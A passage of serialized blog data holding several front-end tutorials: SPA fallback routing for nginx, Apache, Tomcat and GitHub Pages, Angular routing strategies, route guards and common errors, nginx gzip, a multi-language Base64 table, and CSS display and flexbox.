详细解释：\n如请求的是https://deepthan.gitee.io/poetry/life, $uri则是‘/life’,如果‘$uri’‘$uri/’都找不到，就会 fall back 到 try_files 的最后一个选项 /index.html发起一个内部 “子请求”，也就是相当于 nginx 发起一个 HTTP 请求到https://deepthan.gitee.io/poetry/index.html。 这个请求会被 location ~ .php$ { ... } catch 住，也就是进入 FastCGI 的处理程序。而具体的 URI 及参数是在 REQUEST_URI 中传递给 FastCGI 和 WordPress 程序的，因此不受 URI 变化的影响。 \n 2.3 Apache \n Apache的根目录新建一个.htaccess文件\nRewriteEngine On \n \n 如果请求的是现有资源，则按原样执行\nRewriteCond %{DOCUMENT_ROOT}%{REQUEST_URI} -f [OR] \nRewriteCond %{DOCUMENT_ROOT}%{REQUEST_URI} -d \nRewriteRule ^ - [L] \n 如果请求的资源不存在，则使用index.html\nRewriteRule ^ /index.html \n 2.4 Tomcat配置 \n Tomcat/conf/web.xml文件上添加 \n < error-page > \n     < error-code > 404 </ error-code > \n     < location > / </ location > \n </ error-page > \n \n 1 2 3 4 #  2.5 GithubPages / 码云 Pages + 404 页面 \n 对于github pages或码云 Pages来说，我们没办法直接配置Github pages，但可以在commit时添加一个404页。简单的解决方案如下：\n我们在项目的根目录新建404.html，把index.html中的内容完全复制到404.html中就可以了。这样做github pages仍然会在恰当的时候给出一个404响应，浏览器将会正确处理该页，并正常加载我们的应用。 \n \n 关于这方面的hack：  S(GH)PA: The Single-Page App Hack for GitHub Pages \n 3. 带‘#’和不带‘#’原理上有什么区别呢？ \n 3.1  这个得先说下什么是前端路由： \n 以前路由都是后台做的，通过用户请求的url导航到具体的html页面，现在我们在前端可以利用 Angular、vue、react等通过配置文件，达到前端控制路由跳转的功能。\n前端路由的实现方法： \n \n \n 通过hash实现\n当url的hash发生改变时，触发hashchange注册的回调（低版本没有hashchange事件，通过轮回检测url实现），回调中去进行不同的操作，进行不同的内容展示。\n使用hash来实现的话，URI规则中要带上#，路由中#后边的内容就是hash，我们常说的锚点严格来说应该是页面中的a[name]等元素。 \n \n \n HTML5的history api操作浏览器的session history实现\n基于history实现的路由中不带#，就是原始的路由 \n 3.2 Angular中的路由策略 \n angular2提供的路由策略也是基于上面两个原理实现的，可以在@NgModule中通过providers配置或RouterModule.forRoot()配置：\n1） 路由中有# \n @ NgModule ( { \n  imports : [ RouterModule . forRoot ( routes , { useHash : true } ) ] \n } ) \n \n 1 2 3 或 \n @ NgModule ( { \n  imports : [ RouterModule . forRoot ( routes ) ] , \n  providers : [ \n      { provide :  LocationStrategy ,  useClass :  HashLocationStrategy }  \n   ] \n } ) \n \n 1 2 3 4 5 6 HashLocationStragegy\n适用于基于锚点标记的路径，比如/#/**，后端只需要配置一个根路由即可。\n2） html5路由（无#）\n改用 PathLocationStrategy（angular2的默认策略，也就是HTML5路由），使用这个路由的常规路径不带#，这种策略需要后台配置支持，因为我们的应用是单页面应用，如果后台没有正确的配置，当用户在浏览器从一个路由跳往另外一个路由或者刷新时就会返回404，需要在服务端里面覆盖所有的路由情况（后端可以通过nginx或者apache等配置）。 \n @ NgModule ( { \n  imports : [ RouterModule . forRoot ( routes ) ] , \n  providers : [ \n     { provide :  LocationStrategy ,  useClass :  PathLocationStrategy }  \n     // 这一行是可选的，因为默认的LocationStrategy是PathLocationStrategy \n   ] \n } ) \n \n 1 2 3 4 5 6 7 更改index.html中的base href属性，Angular将通过这个属性来处理路由跳转 \n < base   href = " /app/ " > \n \n 1 在后端的服务器上，用下面的正则去匹配所有的页面请求导向index.html页面。\nwe must render the index.html file for any request coming with below pattern\nindex.html \n <! doctype   html > \n < html > \n < head > \n   < meta   charset = " utf-8 " > \n   < title > My App </ title > \n   < base   href = " /app/ " > \n   < body > \n     < app-root > Loading... </ app-root > \n     < script   type = " text/javascript "   src = " vendor.bundle.js " > </ script > \n     < script   type = " text/javascript "   src = " main.bundle.js " > </ script > \n   </ body > \n </ html > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  3.3 前端路由优缺点 \n \n 优点： \n \n \n 从性能和用户体验的层面来比较的话，后端路由每次访问一个新页面的时候都要向服务器发送请求，然后服务器再响应请求，这个过程肯定会有延迟。而前端路由在访问一个新页面的时候仅仅是变换了一下路径而已，没有了网络延迟，对于用户体验来说会有相当大的提升。 \n 在某些场合中，用ajax请求，可以让页面无刷新，页面变了但Url没有变化，用户不能获取到想要的url地址，用前端路由做单页面网页就很好的解决了这个问题。 \n \n \n 缺点：\n使用浏览器的前进，后退键的时候会重新发送请求，没有合理地利用缓存。 \n \n'},{title:"Can't bind to 'formGroup' since it isn't a known property of 'form'",frontmatter:{title:"Can't bind to 'formGroup' since it isn't a known property of 'form'",date:"2021-10-09 22:29:44",tags:["angular"],categories:"front-end-angular",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular_cant-bind-to-formgroup-since-it-isnt-a-known-property-of-form.html",relativePath:"blogs/angular/angular_cant-bind-to-formgroup-since-it-isnt-a-known-property-of-form.md",key:"v-a966a896",path:"/blogs/angular/angular_cant-bind-to-formgroup-since-it-isnt-a-known-property-of-form.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" To fix this error, you just need to import  ReactiveFormsModule  from  @angular/forms  in your module. Here's the example of a basic module with  ReactiveFormsModule  import: \n import   {  NgModule  }   from   '@angular/core' ; \n import   {  BrowserModule  }   from   '@angular/platform-browser' ; \n import   {  FormsModule ,  ReactiveFormsModule  }   from   '@angular/forms' ; \n import   {  AppComponent  }    from   './app.component' ; \n\n@ NgModule ( { \n    imports :   [ \n        BrowserModule , \n        FormsModule , \n        ReactiveFormsModule\n     ] , \n    declarations :   [ \n        AppComponent\n     ] , \n    bootstrap :   [ AppComponent ] \n } ) \n\n export   class   AppModule   {   } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 To explain further,  formGroup  is a selector for directive named  FormGroupDirective  that is a part of  ReactiveFormsModule , hence the need to import it. It is used to bind an existing  FormGroup  to a DOM element. You can read more about it on  Angular's official docs page . \n"},{title:"Angular 元素之间没有间距",frontmatter:{title:"Angular 元素之间没有间距",date:"2021-05-18T19:03:47.000Z",tags:["angular"],categories:"front-end-angular",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular_jHceDjoeh.html",relativePath:"blogs/angular/angular_jHceDjoeh.md",key:"v-ba1a4256",path:"/blogs/angular/angular_jHceDjoeh.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 默认情况下，Angular 6以上将应用程序的angularCompilerOption：preserveWhitespaces设置为false。就会导致元素之间没有间距。 \n 解决办法如下 \n 目前，在JIT模式下，我们可以将其设置为 CompileOptions :\nmain.ts \n platformBrowserDynamic ( ) . bootstrapModule ( AppModule ,   {  preserveWhitespaces :   true   } ) ; \n \n 1 对于aot，我们必须将此选项添加到\ntsconfig.app.json \n { \n   "extends" :   "../tsconfig.json" , \n   "compilerOptions" :   { \n     "outDir" :   "../out-tsc/app" , \n     "baseUrl" :   "./" , \n     "module" :   "es2015" , \n     "types" :   [ ] \n   } , \n   "exclude" :   [ \n     "test.ts" , \n     "**/*.spec.ts" \n   ] , \n   "angularCompilerOptions" :   { \n "preserveWhitespaces" :   true \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 '},{title:"Angular Type 'boolean | null' is not assignable to type 'boolean'.",frontmatter:{title:"Angular Type 'boolean | null' is not assignable to type 'boolean'.",date:"2021-07-27T22:05:08.000Z",tags:["Angular"],categories:"front-end-angular",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular_l6MzUAMd7.html",relativePath:"blogs/angular/angular_l6MzUAMd7.md",key:"v-09aa9075",path:"/blogs/angular/angular_l6MzUAMd7.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' the async pipes return signature is something like  <T>(input$: Observable<T>: T | null  always, because it returns null to the template\nwhile it\'s awaiting a response from an asynchronous call. \n you can do what you\'ve done and allow null, or if you know it will never be null, use a non null assertion operator: \n [ loaded ] = "(loaded$ | async)!" \n \n 1 #  or disable type checking here: \n [ loaded ] = "$any(loaded$ | async)" \n \n 1 #  or for this particular case you could probably do something like this: \n [ loaded ] = "(loaded$ | async) || false" \n \n 1 '},{title:"nginx 开启gzip压缩",frontmatter:{title:"nginx 开启gzip压缩",date:"2021-08-01T23:04:06.000Z",tags:["Angular"],categories:"front-end-angular",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular_mFx6MMDD1.html",relativePath:"blogs/angular/angular_mFx6MMDD1.md",key:"v-a1c8fcd6",path:"/blogs/angular/angular_mFx6MMDD1.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 优化打包编译方式 \n 使用  ng build \'-c=prod\'   ng build --prod --aot   ng build --aot  或者 ng serve --aot \n nginx 进行文件压缩 \n 修改/mydata/nginx/conf目录下的nginx.conf配置文件，开启GZIP压缩； \n http {\n    gzip on; #开启gzip\n    gzip_disable "msie6"; #IE6不使用gzip\n    gzip_vary on; #设置为on会在Header里增加 "Vary: Accept-Encoding"\n    gzip_proxied any; #代理结果数据的压缩\n    gzip_comp_level 6; #gzip压缩比（1~9），越小压缩效果越差，但是越大处理越慢，所以一般取中间值\n    gzip_buffers 16 8k; #获取多少内存用于缓存压缩结果\n    gzip_http_version 1.1; #识别http协议的版本\n    gzip_min_length 1k; #设置允许压缩的页面最小字节数，超过1k的文件会被压缩\n    gzip_types application/javascript text/css; #对特定的MIME类型生效,js和css文件会被压缩\n    include /etc/nginx/conf.d/*.conf;\n}\n \n 1 2 3 4 5 6 7 8 9 10 11 12 nginx返回请求头中添加了Content-Encoding: gzip的信息，设置成功 \n'},{title:"angular 路由守卫",frontmatter:{title:"angular 路由守卫",date:"2021-10-04 17:57:40",tags:["JavaScript"],categories:"front-end-angular",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular_rout_guard.html",relativePath:"blogs/angular/angular_rout_guard.md",key:"v-6b38fbed",path:"/blogs/angular/angular_rout_guard.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" angular防止未经授权的访问 \n 使用路由守卫来防止用户未经授权就导航到应用的某些部分。Angular 中提供了以下路由守卫： \n \n CanActivate \n CanActivateChild \n CanDeactivate \n Resolve \n CanLoad \n \n 创建一项服务 router-guard.service.ts： \n import   {  Injectable  }   from   '@angular/core' ; \n import   { \n  ActivatedRouteSnapshot , \n  CanActivate , \n  Router , \n  RouterStateSnapshot\n }   from   '@angular/router' ; \n\n /**\n * RouterGuardService\n *\n * @export\n * @class RouterGuardService\n * @implements {CanActivate}\n */ \n@ Injectable ( { \n  providedIn :   'root' , \n } ) \n export   class   RouterGuardService   implements   CanActivate   { \n   constructor ( private  router :  Router )   { } \n\n   /**\n   * canActivate\n   *\n   * @param {ActivatedRouteSnapshot} _route\n   * @param {RouterStateSnapshot} _state\n   * @returns {boolean}\n   * @memberof RouterGuardService\n   */ \n   public   canActivate ( \n    _route :  ActivatedRouteSnapshot , \n    _state :  RouterStateSnapshot\n   ) :   boolean   { \n     alert ( _state . url ) ; \n     const  token  =  localStorage . getItem ( 'token' ) ; \n     alert ( 'token'   +  token ) ; \n     if   ( ! token )   { \n       this . router . navigateByUrl ( '/account/login' ) ; \n       return   false ; \n     } \n     return   true ; \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 在路由模块(app-routing.module.ts)中，在 routes 配置中使用相应的属性。这里的 canActivate 会告诉路由器它要协调到这个特定路由的导航。 \n import   {  DashboardLayoutsComponent  }   from   'src/shared/layouts/dashboard-layouts.component' ; \n\n import   {  NgModule  }   from   '@angular/core' ; \n import   {  RouterModule ,  Routes  }   from   '@angular/router' ; \n\n import   {  RouterGuardService  }   from   './services/router-guard.service' ; \n\n const  routes :  Routes  =   [ \n   { \n    path :   'account' , \n     loadChildren :   ( )   => \n       import ( '../business/pages/account/account.module' ) . then ( \n         ( m )   =>  m . AccountModule\n       ) , \n   } , \n   { \n    path :   '' , \n    component :  DashboardLayoutsComponent , \n    canActivate :   [ RouterGuardService ] , \n    children :   [ \n       {  path :   '' ,  redirectTo :   'system/home' ,  pathMatch :   'full'   } , \n       { \n        path :   'examples' , \n         loadChildren :   ( )   => \n           import ( '../business/pages/examples/examples.module' ) . then ( \n             ( m )   =>  m . ExamplesModule\n           ) , \n       } , \n       { \n        path :   'system' , \n         loadChildren :   ( )   => \n           import ( '../business/pages/dashboard/dashboard.module' ) . then ( \n             ( m )   =>  m . DashboardModule\n           ) , \n       } , \n       { \n        path :   'exception' , \n         loadChildren :   ( )   => \n           import ( './pages/exception/exception.module' ) . then ( \n             ( m )   =>  m . ExceptionModule\n           ) , \n       } , \n     ] , \n   } , \n   // Exception \n   {  path :   '**' ,  redirectTo :   'exception/404'   } , \n ] ; \n\n /**\n * AppRoutingModule\n *\n * @export\n * @class AppRoutingModule\n */ \n@ NgModule ( { \n  imports :   [ \n    RouterModule . forRoot ( routes ,   { \n      useHash :   true , \n      relativeLinkResolution :   'legacy' , \n     } ) , \n   ] , \n  exports :   [ RouterModule ] , \n } ) \n export   class   AppRoutingModule   { } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 "},{title:"angular项目版本升级",frontmatter:{title:"angular项目版本升级",date:"2021-10-31 18:56:51",tags:["angular"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular_update_version.html",relativePath:"blogs/angular/angular_update_version.md",key:"v-323679ad",path:"/blogs/angular/angular_update_version.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" \n 运行命令，启动更新程序，查看需要更新的依赖 \n \n ng update\n \n 1 \n 升级剩下的依赖 \n \n ng update --all --force\n \n 1 \n 升级完成后，需要安装 \n \n npm   install \n \n 1 "},{title:"各编程语言中 Base64 编码解码的方法",frontmatter:{title:"各编程语言中 Base64 编码解码的方法",date:"2022-01-19T20:02:36.000Z",tags:["java","javascript","python","linux"],categories:"base64",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/base64/base64_encoding_decoding.html",relativePath:"blogs/base64/base64_encoding_decoding.md",key:"v-92059896",path:"/blogs/base64/base64_encoding_decoding.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 各编程语言中 Base64 编码解码的方法 (其中 String str 表示原文本，String base64 表示编码结果) \n \n \n \n 语言 \n Base64 编码 \n Base64 解码 \n \n \n \n \n JavaScript \n base64 = btoa(str); // IE 10- 需要引入 base64.js 且不支持汉字   或   // 需要引入 CryptoJS   var s = CryptoJS.enc.Utf8.parse(str);   base64 = CryptoJS.enc.Base64.stringify(s); \n str = atob(base64); // IE 10- 需要引入 base64.js 且不支持汉字   或   // 需要引入 CryptoJS  var s = CryptoJS.enc.Base64.parse(base64);   str = s.toString(CryptoJS.enc.Utf8); \n \n \n Linux Shell  (以 test 为例) \n // dGVzdAo=   $ echo test | base64 \n // test   $ echo dGVzdAo= | base64 -d \n \n \n Java \n base64 = new BASE64Encoder() .encode(str.getBytes()); \n str = new String(new BASE64Decoder()  .decodeBuffer(base64)); \n \n \n Python \n import base64   base64 = base64.b64encode(str) \n import base64 str = base64.b64decode(base64) \n \n \n PHP \n $base64 = base64_encode($str); \n $str = base64_decode($base64); \n \n \n C#/.NET \n byte[] bytes = System.Text.Encoding.UTF8.GetBytes(str); base64 = System.Convert.ToBase64String(bytes); \n byte[] bytes = System.Convert  .FromBase64String(base64);   str = System.Text.Encoding.UTF8 .GetString(bytes); \n \n \n Perl \n use MIME::Base64; $base64 = encode_base64($str); \n use MIME::Base64; $str = decode_base64($base64); \n \n \n Golang \n import b64 "encoding/base64"    ...   base64 := b64.StdEncoding .EncodeToString([]byte(str)) \n import b64 "encoding/base64"   ...   str := b64.StdEncoding .DecodeString(base64) \n \n \n Ruby \n require "base64" base64 = Base64.encode64(str) \n require "base64" str = Base64.decode64(base64) \n \n \n MySQL/MariaDB \n // 参数也可以是一个字段   SELECT TO_BASE64(str); \n // 参数也可以是一个字段   SELECT FROM_BASE64(base64); \n \n \n PostgreSQL \n SELECT encode(str, \'base64\'); \n SELECT decode(base64, \'base64\'); \n \n \n \n'},{title:"CSS display 属性详解",frontmatter:{title:"CSS display 属性详解",date:"2021-05-15T10:49:56.000Z",tags:["css","display"],categories:"front-end-css",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/css/css-display-shu-xing-xiang-jie.html",relativePath:"blogs/css/css-display-shu-xing-xiang-jie.md",key:"v-aa3952aa",path:"/blogs/css/css-display-shu-xing-xiang-jie.html",headers:[{level:2,title:"display: none",slug:"display-none"},{level:2,title:"display: inline",slug:"display-inline"},{level:2,title:"display: block",slug:"display-block"},{level:2,title:"display: list-item",slug:"display-list-item"},{level:2,title:"display: inline-block",slug:"display-inline-block"},{level:2,title:"display: table",slug:"display-table"},{level:2,title:"display: inline-list-item",slug:"display-inline-list-item"},{level:2,title:"display: flex",slug:"display-flex"},{level:3,title:"容器属性",slug:"容器属性"},{level:3,title:"项目属性",slug:"项目属性"},{level:2,title:"display: -webkit-box",slug:"display-webkit-box"},{level:3,title:"容器属性",slug:"容器属性-2"},{level:3,title:"项目属性",slug:"项目属性-2"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' display的所有属性 \n /* CSS 1 */\ndisplay: none;\ndisplay: inline;\ndisplay: block;\ndisplay: list-item;\n\n/* CSS 2.1 */\ndisplay: inline-block;\n\ndisplay: table;\ndisplay: inline-table;\ndisplay: table-cell;\ndisplay: table-column;\ndisplay: table-column-group;\ndisplay: table-footer-group;\ndisplay: table-header-group;\ndisplay: table-row;\ndisplay: table-row-group;\ndisplay: table-caption;\n/* CSS 2.1 */\n\n/* CSS 3 */\ndisplay: inline-list-item;\ndisplay: flex;\ndisplay: box;\ndisplay: inline-flex;\n\ndisplay: grid;\ndisplay: inline-grid;\n\ndisplay: ruby;\ndisplay: ruby-base;\ndisplay: ruby-text;\ndisplay: ruby-base-container;\ndisplay: ruby-text-container;\n/* CSS 3 */\n\n/* Experimental values */\ndisplay: contents;\ndisplay: run-in;\n/* Experimental values */\n\n/* Global values */\ndisplay: inherit;\ndisplay: initial;\ndisplay: unset;\n \n 下面就display的重要属性进行讲解，并配合一些相关的例子 \n 基本属性 \n  display: none \n none 是 CSS 1 就提出来的属性，将元素设置为none的时候既不会占据空间，也无法显示，相当于该元素不存在。\n该属性可以用来改善重排与重绘，同时我也经常用它来做模态窗等效果。 \n  display: inline \n inline也是 CSS 1 提出的属性，它主要用来设置行内元素属性，设置了该属性之后设置高度、宽度都无效，同时text-align属性设置也无效，但是设置了line-height会让inline元素居中 \n  display: block \n 设置元素为块状元素，如果不指定宽高，默认会继承父元素的宽度，并且独占一行，即使宽度有剩余也会独占一行，高度一般以子元素撑开的高度为准，当然也可以自己设置宽度和高度。 \n  display: list-item \n 此属性默认会把元素作为列表显示，要完全模仿列表的话还需要加上  list-style-position，list-style-type \n  display: inline-block \n inline-block 为 CSS 2.1 新增的属性。  inline-block 既具有block的宽高特性又具有inline的同行元素特性。 通过 inline-block 结合 text-align: justify  还可以实现固定宽高的列表两端对齐布局 \n  display: table \n table 此元素会作为块级表格来显示（类似table），表格前后带有换行符。CSS表格能够解决所有那些我们在使用绝对定位和浮动定位进行多列布局时所遇到的问题。例如， display:table 的CSS声明能够让一个HTML元素和它的子节点像table元素一样。使用基于表格的CSS布局，使我们能够轻松定义一个单元格的边界、背景等样式， 而不会产生因为使用了table那样的制表标签所导致的语义化问题。 \n 利用table的特性，我们能够轻易的实现三栏布局，并且能够兼容IE8 \n  display: inline-list-item \n 我在MDN上面看到有这个属性，但是我实际尝试发现这个属性是不能使用的，在  caniuse  上面也没有找到这个元素的兼容性，所以应该是不能使用的，支持度全无。 \n  display: flex \n flex是一种弹性布局属性\n 注意，设为Flex布局以后，子元素的float、clear和vertical-align属性将失效。 \n主要属性有两大类：容器属性和项目的属性 \n 容器属性 \n \n flex-direction: 属性决定主轴的方向（即项目的排列方向）。 \n flex-wrap: 默认情况下，项目都排在一条线（又称"轴线"）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。 \n flex-flow: 属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap。 \n justify-content: 属性定义了项目在主轴上的对齐方式。 \n align-items: 属性定义项目在交叉轴上如何对齐。 \n align-content: 属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。 \n 项目属性 \n \n order: 定义项目的排列顺序。数值越小，排列越靠前，默认为0。 \n flex-grow: 定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。 \n flex-shrink: 属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。 \n flex-basis: 属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。 \n flex: 属性是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。 \n align-self: 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。 \n  display: -webkit-box \n 由于某X5浏览器某些版本还不支持最新版的flex布局，所以为了保证良好的运行，建议还是使用display: box，box和flex布局的主要差别如下: \n 容器属性 \n \n display: box\n该显示样式的新值可将此元素及其直系子代加入弹性框模型中。Flexbox 模型只适用于直系子代。 \n box-orient\n值：horizontal | vertical | inherit\n框的子代是如何排列的？还有两个值：inline-axis（真正的默认值）和 block-axis，但是它们分别映射到水平和垂直方向。 \n box-pack\n值：start | end | center | justify\n设置沿 box-orient 轴的框排列方式。因此，如果 box-orient 是水平方向，就会选择框的子代的水平排列方式，反之亦然。 \n box-align\n值：start | end | center | baseline | stretch\n基本上而言是 box-pack 的同级属性。设置框的子代在框中的排列方式。如果方向是水平的，该属性就会决定垂直排列，反之亦然。 \n 项目属性 \n \n box-flex\n值：0 | 任意整数\n该子代的弹性比。弹性比为 1 的子代占据父代框的空间是弹性比为 2 的同级属性的两倍。其默认值为 0，也就是不具有弹性 \n \n'},{title:"CSS Flex 布局",frontmatter:{title:"CSS Flex 布局",date:"2021-05-15T11:17:30.000Z",tags:["css","flex","html"],categories:"front-end-css",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/css/css-flex-bu-ju.html",relativePath:"blogs/css/css-flex-bu-ju.md",key:"v-049f88b7",path:"/blogs/css/css-flex-bu-ju.html",headers:[{level:2,title:"flex-direction: 决定主轴的方向(即项目的排列方向)",slug:"flex-direction-决定主轴的方向-即项目的排列方向"},{level:2,title:"flex-wrap: 决定容器内项目是否可换行",slug:"flex-wrap-决定容器内项目是否可换行"},{level:2,title:"flex-flow: flex-direction 和 flex-wrap 的简写形式",slug:"flex-flow-flex-direction-和-flex-wrap-的简写形式"},{level:2,title:"justify-content：定义了项目在主轴的对齐方式",slug:"justify-content-定义了项目在主轴的对齐方式"},{level:2,title:"align-items: 定义了项目在交叉轴上的对齐方式",slug:"align-items-定义了项目在交叉轴上的对齐方式"},{level:2,title:"align-content: 定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用",slug:"align-content-定义了多根轴线的对齐方式-如果项目只有一根轴线-那么该属性将不起作用"},{level:2,title:"order: 定义项目在容器中的排列顺序，数值越小，排列越靠前，默认值为 0",slug:"order-定义项目在容器中的排列顺序-数值越小-排列越靠前-默认值为-0"},{level:2,title:"flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间",slug:"flex-basis-定义了在分配多余空间之前-项目占据的主轴空间-浏览器根据这个属性-计算主轴是否有多余空间"},{level:2,title:"flex-grow: 定义项目的放大比例",slug:"flex-grow-定义项目的放大比例"},{level:2,title:"flex-shrink: 定义了项目的缩小比例",slug:"flex-shrink-定义了项目的缩小比例"},{level:2,title:"flex: flex-grow, flex-shrink 和 flex-basis的简写",slug:"flex-flex-grow-flex-shrink-和-flex-basis的简写"},{level:2,title:"align-self: 允许单个项目有与其他项目不一样的对齐方式",slug:"align-self-允许单个项目有与其他项目不一样的对齐方式"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" Flex 基本概念： \n \n在 flex 容器中默认存在两条轴，水平主轴(main axis) 和垂直的交叉轴(cross axis)，这是默认的设置，当然你可以通过修改使垂直方向变为主轴，水平方向变为交叉轴，这个我们后面再说。\n在容器中的每个单元块被称之为 flex item，每个项目占据的主轴空间为 (main size), 占据的交叉轴的空间为 (cross size)。\n这里需要强调，不能先入为主认为宽度就是 main size，高度就是 cross size，这个还要取决于你主轴的方向，如果你垂直方向是主轴，那么项目的高度就是 main size。 \n Flex 容器： \n 首先，实现 flex 布局需要先指定一个容器，任何一个容器都可以被指定为 flex 布局，这样容器内部的元素就可以使用 flex 来进行布局。 \n .container   { \n     display :  flex | inline-flex ;        //可以有两种取值\n } \n \n 1 2 3 分别生成一个块状或行内的 flex 容器盒子。简单说来，如果你使用块元素如 div，你就可以使用 flex，而如果你使用行内元素，你可以使用 inline-flex。 \n 需要注意的是：当时设置 flex 布局之后，子元素的 float、clear、vertical-align 的属性将会失效。 \n 有下面六种属性可以设置在容器上，它们分别是： \n \n flex-direction \n flex-wrap \n flex-flow \n justify-content \n align-items \n align-content \n  flex-direction: 决定主轴的方向(即项目的排列方向) \n .container   { \n     flex-direction :  row | row-reverse | column | column-reverse ; \n } \n \n 1 2 3 默认值：row，主轴为水平方向，起点在左端。\n \n row-reverse：主轴为水平方向，起点在右端\n \n column：主轴为垂直方向，起点在上沿\n \n column-reverse：主轴为垂直方向，起点在下沿\n  flex-wrap: 决定容器内项目是否可换行 \n 默认情况下，项目都排在主轴线上，使用 flex-wrap 可实现项目的换行。 \n .container   { \n     flex-wrap :  nowrap | wrap | wrap-reverse ; \n } \n \n 1 2 3 默认值：nowrap 不换行，即当主轴尺寸固定时，当空间不足时，项目尺寸会随之调整而并不会挤到下一行。\n \nwrap：项目主轴总尺寸超出容器时换行，第一行在上方\n \nwrap-reverse：换行，第一行在下方\n  flex-flow: flex-direction 和 flex-wrap 的简写形式 \n .container   { \n     flex-flow :  <flex-direction> || <flex-wrap> ; \n } \n \n 1 2 3 默认值为: row nowrap，感觉没什么卵用，老老实实分开写就好了。这样就不用记住这个属性了。 \n  justify-content：定义了项目在主轴的对齐方式 \n .container   { \n     justify-content :  flex-start | flex-end | center | space-between | space-around ; \n } \n \n 1 2 3 建立在主轴为水平方向时测试，即 flex-direction: row \n默认值: flex-start 左对齐\n \nflex-end：右对齐\n \ncenter：居中\n \nspace-between：两端对齐，项目之间的间隔相等，即剩余空间等分成间隙。\n \nspace-around：每个项目两侧的间隔相等，所以项目之间的间隔比项目与边缘的间隔大一倍。\n  align-items: 定义了项目在交叉轴上的对齐方式 \n .container   { \n     align-items :  flex-start | flex-end | center | baseline | stretch ; \n } \n \n 1 2 3 建立在主轴为水平方向时测试，即 flex-direction: row \n默认值为 stretch 即如果项目未设置高度或者设为 auto，将占满整个容器的高度。\n \n假设容器高度设置为 100px，而项目都没有设置高度的情况下，则项目的高度也为 100px。\nflex-start：交叉轴的起点对齐\n \n假设容器高度设置为 100px，而项目分别为 20px, 40px, 60px, 80px, 100px, 则如上图显示。\nflex-end：交叉轴的终点对齐\n \ncenter：交叉轴的中点对齐\n \nbaseline: 项目的第一行文字的基线对齐\n \n以文字的底部为主，仔细看图可以理解。 \n  align-content: 定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用 \n .container   { \n     align-content :  flex-start | flex-end | center | space-between | space-around | stretch ; \n } \n \n 1 2 3 这个这样理解： \n 当你 flex-wrap 设置为 nowrap 的时候，容器仅存在一根轴线，因为项目不会换行，就不会产生多条轴线。 \n 当你 flex-wrap 设置为 wrap 的时候，容器可能会出现多条轴线，这时候你就需要去设置多条轴线之间的对齐方式了。 \n 建立在主轴为水平方向时测试，即 flex-direction: row, flex-wrap: wrap \n 默认值为 stretch，看下面的图就很好理解了\n \n从图可以看出又三条轴线(因为容器宽度有限)，当值为 stretch 时会三条轴线平分容器的垂直方向上的空间。 \n 值得注意的是，虽然在每条轴线上项目的默认值也为 stretch，但是由于我每个项目我都设置了高度，所以它并没有撑开整个容器。如果项目不设置高度的话就会变成下面这样：\n \n这个我在前面也有提到(align-items)，这里重点还是理解三条轴线会平分垂直轴上的空间。 \n flex-start：轴线全部在交叉轴上的起点对齐\n \nflex-end：轴线全部在交叉轴上的终点对齐\n \ncenter：轴线全部在交叉轴上的中间对齐\n \nspace-between：轴线两端对齐，之间的间隔相等，即剩余空间等分成间隙。\n \nspace-around：每个轴线两侧的间隔相等，所以轴线之间的间隔比轴线与边缘的间隔大一倍。\n \n 到这里关于容器上的所有属性都讲完了，接下来就来讲讲关于在 flex item 上的属性 \n Flex 项目属性： \n 有六种属性可运用在 item 项目上： \n \n order \n flex-basis \n flex-grow \n flex-shrink \n flex \n align-self \n  order: 定义项目在容器中的排列顺序，数值越小，排列越靠前，默认值为 0 \n .item   { \n     order :  <integer> ; \n } \n \n 1 2 3 \n在 HTML 结构中，虽然 -2，-1 的 item 排在后面，但是由于分别设置了 order，使之能够排到最前面 \n  flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间 \n .item   { \n     flex-basis :  <length> | auto ; \n } \n \n 1 2 3 默认值：auto，即项目本来的大小, 这时候 item 的宽高取决于 width 或 height 的值。 \n 